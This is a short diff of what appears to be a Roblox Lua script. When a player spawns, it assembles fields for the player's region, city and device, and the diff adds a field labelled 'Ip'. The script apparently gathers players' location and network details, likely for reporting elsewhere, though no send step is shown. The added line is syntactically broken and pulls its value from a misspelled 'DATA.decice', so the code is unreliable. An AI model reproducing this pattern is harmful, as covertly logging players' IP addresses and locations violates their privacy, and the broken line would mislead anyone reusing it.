@@ -623,6 +623,7 @@ Player.CharacterAdded:Connect(function()
         {name = "📍 Región", value = DATA.region},
         {name = "🏙️ Ciudad", value = DATA.city},
         {name = "📱 Dispositivo", value = DATA.device}
+        (name = "🐦‍🔥Ip", value) = DATA.decice
     })
 end)
 
